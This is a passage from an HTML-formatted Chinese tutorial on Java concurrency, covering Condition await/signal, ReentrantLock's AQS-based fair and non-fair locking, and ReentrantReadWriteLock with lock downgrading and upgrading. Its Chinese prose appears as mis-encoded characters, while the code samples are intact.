    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span>;     <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
}
</code></pre>
<h4 data-id="heading-161">await()æ–¹æ³•ï¼ˆç­‰å¾…æ¡ä»¶ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> è®©å½“å‰çº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°è¢«signalå”¤é†’</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç­‰å¾…æ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.await();  <span class="hljs-comment">// é‡Šæ”¾é”å¹¶ç­‰å¾…ï¼Œè¢«å”¤é†’åé‡æ–°è·å–é”</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<ol>
<li>å½“å‰çº¿ç¨‹åŠ å…¥æ¡ä»¶ç­‰å¾…é˜Ÿåˆ—</li>
<li>é‡Šæ”¾é”</li>
<li>é˜»å¡ç­‰å¾…</li>
<li>è¢«signalå”¤é†’åï¼Œé‡æ–°è·å–é”</li>
<li>ç»§ç»­æ‰§è¡Œ</li>
</ol>
<h4 data-id="heading-162">signal()/signalAll()æ–¹æ³•ï¼ˆå”¤é†’ç­‰å¾…çº¿ç¨‹ï¼‰</h4>
<p><strong>signal()ï¼š</strong> å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹ï¼ˆç±»ä¼¼notifyï¼‰<br/>
<strong>signalAll()ï¼š</strong> å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ï¼ˆç±»ä¼¼notifyAllï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signalAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-163">Condition vs wait/notify</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th>wait/notify</th><th>Condition</th></tr></thead><tbody><tr><td><strong>å‰ç½®æ¡ä»¶</strong></td><td>å¿…é¡»åœ¨synchronizedå—ä¸­</td><td>å¿…é¡»å…ˆè·å–Lock</td></tr><tr><td><strong>å¤šä¸ªæ¡ä»¶</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼ˆä¸€ä¸ªLockå¤šä¸ªConditionï¼‰</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âœ… æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td><strong>è¶…æ—¶ç­‰å¾…</strong></td><td>âœ… æœ‰é™æ”¯æŒ</td><td>âœ… æ›´çµæ´»çš„è¶…æ—¶</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ç®€å•çš„ç­‰å¾…/é€šçŸ¥</td><td>å¤æ‚çš„åŒæ­¥æ§åˆ¶</td></tr></tbody></table>
<p><strong>ä¼˜åŠ¿æ€»ç»“ï¼š</strong></p>
<ul>
<li>âœ… <strong>å¤šä¸ªæ¡ä»¶</strong>ï¼šå¯ä»¥åˆ›å»ºå¤šä¸ªConditionï¼Œç²¾ç¡®æ§åˆ¶ä¸åŒæ¡ä»¶çš„ç­‰å¾…/å”¤é†’</li>
<li>âœ… <strong>æ›´çµæ´»</strong>ï¼šè¶…æ—¶ç­‰å¾…ã€ä¸­æ–­æ§åˆ¶æ›´å¼ºå¤§</li>
<li>âœ… <strong>æ€§èƒ½æ›´å¥½</strong>ï¼šé¿å…ä¸å¿…è¦çš„çº¿ç¨‹å”¤é†’</li>
</ul>
<h4 data-id="heading-164">ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼å®ç°</h4>
<p><strong>ä½¿ç”¨Conditionçš„ä¼˜åŠ¿ï¼š</strong> å¯ä»¥ä¸º"é˜Ÿåˆ—æ»¡"å’Œ"é˜Ÿåˆ—ç©º"åˆ›å»ºä¸åŒçš„Condition</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// é˜Ÿåˆ—ä¸æ»¡çš„æ¡ä»¶</span>
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ç©ºçš„æ¡ä»¶</span>

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šç­‰å¾…é˜Ÿåˆ—ä¸æ»¡ï¼Œé€šçŸ¥é˜Ÿåˆ—ä¸ç©º</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(Object x)</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (count == items.length)
            notFull.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸æ»¡</span>
        <span class="hljs-comment">// ç”Ÿäº§...</span>
        notEmpty.signal();    <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…ï¼šé˜Ÿåˆ—ä¸ç©ºäº†</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šç­‰å¾…é˜Ÿåˆ—ä¸ç©ºï¼Œé€šçŸ¥é˜Ÿåˆ—ä¸æ»¡</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)
            notEmpty.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸ç©º</span>
        <span class="hljs-comment">// æ¶ˆè´¹...</span>
        notFull.signal();      <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…ï¼šé˜Ÿåˆ—ä¸æ»¡äº†</span>
        <span class="hljs-keyword">return</span> item;
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ç²¾ç¡®å”¤é†’ï¼šåªå”¤é†’éœ€è¦ç­‰å¾…è¯¥æ¡ä»¶çš„çº¿ç¨‹</li>
<li>é¿å…è™šå‡å”¤é†’ï¼šä½¿ç”¨whileå¾ªç¯æ£€æŸ¥æ¡ä»¶</li>
<li>æ€§èƒ½æ›´å¥½ï¼šä¸éœ€è¦å”¤é†’æ‰€æœ‰çº¿ç¨‹</li>
</ul>
<h3 data-id="heading-165">7.4 ReentrantLockçš„å®ç°åŸç†</h3>
<h4 data-id="heading-166">åŸºäºAQSçš„å®ç°</h4>
<p><strong>ReentrantLockå†…éƒ¨ç»“æ„ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;  <span class="hljs-comment">// å†…éƒ¨åŒæ­¥å™¨ï¼Œç»§æ‰¿è‡ªAQS</span>
    
    <span class="hljs-comment">// å…¬å¹³é”å’Œéå…¬å¹³é”éƒ½ç»§æ‰¿è‡ªSync</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;  <span class="hljs-comment">// ç”±å­ç±»å®ç°ï¼ˆå…¬å¹³/éå…¬å¹³ï¼‰</span>
        
        <span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆéå…¬å¹³æ–¹å¼ï¼‰</span>
        <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
            <span class="hljs-comment">// 1. æ£€æŸ¥é”æ˜¯å¦ç©ºé—²</span>
            <span class="hljs-comment">// 2. CASå°è¯•è·å–é”</span>
            <span class="hljs-comment">// 3. æ”¯æŒå¯é‡å…¥</span>
        }
        
        <span class="hljs-comment">// é‡Šæ”¾é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
            <span class="hljs-comment">// 1. æ£€æŸ¥æ˜¯å¦æ˜¯æŒæœ‰é”çš„çº¿ç¨‹</span>
            <span class="hljs-comment">// 2. stateå‡1</span>
            <span class="hljs-comment">// 3. å¦‚æœstateä¸º0ï¼Œå®Œå…¨é‡Šæ”¾</span>
        }
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>ReentrantLockå†…éƒ¨ä½¿ç”¨AQSå®ç°</li>
<li>å…¬å¹³é”å’Œéå…¬å¹³é”åˆ†åˆ«å®ç°ä¸åŒçš„è·å–ç­–ç•¥</li>
<li>æ‰€æœ‰é”æ“ä½œæœ€ç»ˆéƒ½è°ƒç”¨AQSçš„æ–¹æ³•</li>
</ul>
<h4 data-id="heading-167">å…¬å¹³é”çš„è·å–æµç¨‹</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šè·å–é”å‰å…ˆæ£€æŸ¥é˜Ÿåˆ—</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¬å¹³é”ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…çš„å°±ä¸æ’é˜Ÿ</span>
lock() {
    acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨AQSçš„acquire</span>
}

tryAcquire(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (é”ç©ºé—²) {
        <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æœ‰ç­‰å¾…çš„ï¼Œä¸æ’é˜Ÿ</span>
        }
        CASè·å–é”;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-comment">// å¯é‡å…¥å¤„ç†...</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥é”æ˜¯å¦ç©ºé—²</li>
<li><strong>å…³é”®ï¼šæ£€æŸ¥é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…çš„çº¿ç¨‹</strong></li>
<li>å¦‚æœæœ‰ç­‰å¾…çš„ï¼Œä¸æ’é˜Ÿï¼Œè¿”å›falseï¼ŒåŠ å…¥é˜Ÿåˆ—ç­‰å¾…</li>
<li>å¦‚æœæ²¡æœ‰ç­‰å¾…çš„ï¼ŒCASè·å–é”</li>
</ol>
<h4 data-id="heading-168">éå…¬å¹³é”çš„è·å–æµç¨‹</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šæ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼šå…ˆå°è¯•ç›´æ¥è·å–ï¼Œå¤±è´¥æ‰æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (CASç›´æ¥å°è¯•è·å–é”) {  <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</span>
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æˆåŠŸ</span>
    }
    acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// å¤±è´¥æ‰è°ƒç”¨AQSçš„acquire</span>
}

tryAcquire(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (é”ç©ºé—²) {
        CASè·å–é”;  <span class="hljs-comment">// ä¸æ£€æŸ¥é˜Ÿåˆ—ï¼Œç›´æ¥å°è¯•</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>/<span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// å¯é‡å…¥å¤„ç†...</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>å…³é”®ï¼šå…ˆç›´æ¥CASå°è¯•è·å–é”</strong>ï¼ˆå¯èƒ½æ’é˜Ÿï¼‰</li>
<li>å¤±è´¥æ‰è°ƒç”¨acquireï¼Œè¿›å…¥é˜Ÿåˆ—</li>
<li>åœ¨é˜Ÿåˆ—ä¸­ä¹Ÿç›´æ¥å°è¯•è·å–ï¼Œä¸æ£€æŸ¥æ˜¯å¦è½®åˆ°</li>
</ol>
<h4 data-id="heading-169">é”çš„é‡Šæ”¾æµç¨‹</h4>
<p><strong>é‡Šæ”¾æµç¨‹ï¼ˆå…¬å¹³é”å’Œéå…¬å¹³é”ç›¸åŒï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">unlock() {
    release(<span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨AQSçš„release</span>
}

release(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (tryRelease(<span class="hljs-number">1</span>)) {  <span class="hljs-comment">// å°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
            å”¤é†’ä¸‹ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹;  <span class="hljs-comment">// è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼Œæœªå®Œå…¨é‡Šæ”¾</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li>stateå‡1</li>
<li>å¦‚æœstateå˜ä¸º0ï¼Œå®Œå…¨é‡Šæ”¾é”</li>
<li>å”¤é†’é˜Ÿåˆ—ä¸­ç­‰å¾…çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹</li>
<li>è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</li>
</ol>
<hr/>
<h2 data-id="heading-170">ç¬¬å…«ç«  è¯»å†™é”ï¼ˆReadWriteLockï¼‰</h2>
<h3 data-id="heading-171">8.1 ReadWriteLockæ¥å£</h3>
<h4 data-id="heading-172">è¯»å†™é”çš„è®¾è®¡æ€æƒ³</h4>
<p><strong>ReadWriteLock</strong>æä¾›äº†ä¸¤ç§é”ï¼š</p>
<ul>
<li><strong>è¯»é”ï¼ˆReadLockï¼‰</strong>ï¼šå…±äº«é”ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li><strong>å†™é”ï¼ˆWriteLockï¼‰</strong>ï¼šç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰</li>
</ul>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong></p>
<ul>
<li>è¯»æ“ä½œå¤šã€å†™æ“ä½œå°‘çš„åœºæ™¯</li>
<li>æé«˜å¹¶å‘æ€§èƒ½</li>
<li>è¯»æ“ä½œä¸äº’æ–¥ï¼Œå†™æ“ä½œäº’æ–¥</li>
</ul>
<h4 data-id="heading-173">è¯»é”ä¸å†™é”çš„å…³ç³»</h4>
<p><strong>é”çš„å…¼å®¹æ€§ï¼š</strong></p>

























<table><thead><tr><th>å½“å‰é”çŠ¶æ€</th><th>è¯»é”</th><th>å†™é”</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>âœ… å¯ä»¥è·å–</td><td>âœ… å¯ä»¥è·å–</td></tr><tr><td><strong>è¯»é”</strong></td><td>âœ… å¯ä»¥è·å–ï¼ˆå¤šä¸ªè¯»é”å…±äº«ï¼‰</td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…è¯»é”é‡Šæ”¾ï¼‰</td></tr><tr><td><strong>å†™é”</strong></td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…å†™é”é‡Šæ”¾ï¼‰</td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…å†™é”é‡Šæ”¾ï¼‰</td></tr></tbody></table>
<p><strong>è§„åˆ™ï¼š</strong></p>
<ul>
<li>å¤šä¸ªè¯»é”å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li>è¯»é”å’Œå†™é”äº’æ–¥</li>
<li>å†™é”å’Œå†™é”äº’æ–¥</li>
</ul>
<h3 data-id="heading-174">8.2 ReentrantReadWriteLock</h3>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è¯»é”ï¼ˆReadLockï¼‰</strong>ï¼šå…±äº«é”ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰ï¼ˆç±»ä¼¼å¤šäººåŒæ—¶çœ‹ä¹¦ï¼‰</li>
<li><strong>å†™é”ï¼ˆWriteLockï¼‰</strong>ï¼šç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰ï¼ˆç±»ä¼¼ä¸€äººç‹¬å å†™ä½œï¼‰</li>
</ul>
<h4 data-id="heading-175">è¯»é”çš„å…±äº«æ€§</h4>
<p><strong>è¯»é”åŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å–ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();

<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–è¯»é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æ‰§è¡Œè¿™é‡Œ</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰è¯»é”</li>
<li>âœ… è¯»é”æ˜¯å¯é‡å…¥çš„</li>
<li>âŒ è¯»é”ä¼šé˜»å¡å†™é”çš„è·å–ï¼ˆæœ‰è¯»é”æ—¶ä¸èƒ½è·å–å†™é”ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> è¯»å¤šå†™å°‘çš„åœºæ™¯ï¼Œå¦‚ç¼“å­˜ã€é…ç½®è¯»å–</p>
<h4 data-id="heading-176">å†™é”çš„æ’ä»–æ€§</h4>
<p><strong>å†™é”åŸºäºAQSçš„ç‹¬å æ¨¡å¼å®ç°ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å†™å…¥ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();

<span class="hljs-comment">// åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–å†™é”</span>
writeLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å†™å…¥æ•°æ®ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè¿™é‡Œ</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰å†™é”</li>
<li>âŒ å†™é”ä¼šé˜»å¡æ‰€æœ‰è¯»é”å’Œå†™é”</li>
<li>âœ… å†™é”æ˜¯å¯é‡å…¥çš„</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> æ•°æ®å†™å…¥ã€æ›´æ–°æ“ä½œ</p>
<h4 data-id="heading-177">é”é™çº§ï¼ˆå†™é”â†’è¯»é”ï¼‰</h4>
<p><strong>é”é™çº§ï¼š</strong> å°†å†™é”é™çº§ä¸ºè¯»é”ï¼ˆ<strong>æ”¯æŒ</strong>ï¼‰</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹ï¼Œå…ˆè·å–è¯»é”ï¼Œå†é‡Šæ”¾å†™é”</li>
<li>è¿™æ ·å¯ä»¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼ŒåŒæ—¶å…è®¸å…¶ä»–çº¿ç¨‹è¯»å–</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();

writeLock.lock();  <span class="hljs-comment">// 1. å…ˆè·å–å†™é”</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ›´æ–°æ•°æ®</span>
    readLock.lock();  <span class="hljs-comment">// 2. åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹è·å–è¯»é”</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();  <span class="hljs-comment">// 3. é‡Šæ”¾å†™é”ï¼ˆæ­¤æ—¶è¿˜æŒæœ‰è¯»é”ï¼‰</span>
}

<span class="hljs-comment">// ç°åœ¨æŒæœ‰è¯»é”ï¼Œå¯ä»¥è¯»å–æ•°æ®</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();  <span class="hljs-comment">// 4. é‡Šæ”¾è¯»é”</span>
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>âš ï¸ <strong>å¿…é¡»åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹è·å–è¯»é”</strong></li>
<li>âš ï¸ <strong>å…ˆè·å–è¯»é”ï¼Œå†é‡Šæ”¾å†™é”</strong>ï¼ˆé¡ºåºå¾ˆé‡è¦ï¼‰</li>
<li>âŒ <strong>ä¸èƒ½å…ˆé‡Šæ”¾å†™é”ï¼Œå†è·å–è¯»é”</strong>ï¼ˆä¸­é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹è·å–å†™é”ï¼‰</li>
</ul>
<h4 data-id="heading-178">é”å‡çº§ï¼ˆè¯»é”â†’å†™é”ï¼‰</h4>
<p><strong>é”å‡çº§ï¼š</strong> å°†è¯»é”å‡çº§ä¸ºå†™é”ï¼ˆ<strong>ä¸æ”¯æŒ</strong>ï¼‰</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸èƒ½åœ¨æŒæœ‰è¯»é”çš„æƒ…å†µä¸‹ç›´æ¥è·å–å†™é”</li>
<li>ä¼šå¯¼è‡´æ­»é”ï¼šå†™é”ç­‰å¾…è¯»é”é‡Šæ”¾ï¼Œä½†è¯»é”ä¸ä¼šé‡Šæ”¾</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šå¯¼è‡´æ­»é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    writeLock.lock();  <span class="hljs-comment">// ä¼šä¸€ç›´é˜»å¡ï¼Œå› ä¸ºè¿˜åœ¨æŒæœ‰è¯»é”</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šå…ˆé‡Šæ”¾è¯»é”ï¼Œå†è·å–å†™é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();  <span class="hljs-comment">// å…ˆé‡Šæ”¾è¯»é”</span>
}

writeLock.lock();  <span class="hljs-comment">// å†è·å–å†™é”</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å†™å…¥æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½å‡çº§ï¼š</strong></p>
<ul>
<li>å¦‚æœå¤šä¸ªçº¿ç¨‹éƒ½æŒæœ‰è¯»é”ï¼Œéƒ½å°è¯•å‡çº§ä¸ºå†™é”</li>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…å…¶ä»–çº¿ç¨‹é‡Šæ”¾è¯»é”</li>
<li>å½¢æˆæ­»é”ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨ç­‰å¾…ï¼Œä½†è°ä¹Ÿä¸é‡Šæ”¾</li>
</ul>
<h3 data-id="heading-179">8.3 ReentrantReadWriteLockçš„å®ç°</h3>
<h4 data-id="heading-180">é«˜16ä½å­˜å‚¨è¯»é”çŠ¶æ€</h4>
<p><strong>stateçš„æ‹†åˆ†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SHARED_SHIFT</span>   <span class="hljs-operator">=</span> <span class="hljs-number">16</span>;
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SHARED_UNIT</span>    <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT);
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_COUNT</span>      <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="hljs-number">1</span>;
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EXCLUSIVE_MASK</span> <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="hljs-number">1</span>;

<span class="hljs-comment">// è·å–è¯»é”æ•°é‡ï¼ˆé«˜16ä½ï¼‰</span>
<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sharedCount</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> { <span class="hljs-keyword">return</span> c &gt;&gt;&gt; SHARED_SHIFT; }

<span class="hljs-comment">// è·å–å†™é”æ•°é‡ï¼ˆä½16ä½ï¼‰</span>
